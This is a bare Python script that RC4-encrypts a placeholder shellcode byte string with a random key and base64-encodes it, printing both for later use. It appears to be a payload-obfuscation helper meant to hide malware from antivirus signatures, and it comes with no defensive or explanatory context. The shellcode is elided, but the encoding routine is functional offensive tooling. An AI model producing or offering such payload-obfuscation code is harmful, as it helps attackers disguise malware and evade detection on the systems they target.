import base64

from Crypto.Cipher import ARC4
from Crypto.Random import get_random_bytes

shellcode = b'\xfc\x48...'

key = get_random_bytes(16)

rc4 = ARC4.new(key)
encoded_shellcode = base64.b64encode(rc4.encrypt(shellcode))

print("key = {}\nenc_shellcode = {}".format(key, encoded_shellcode))
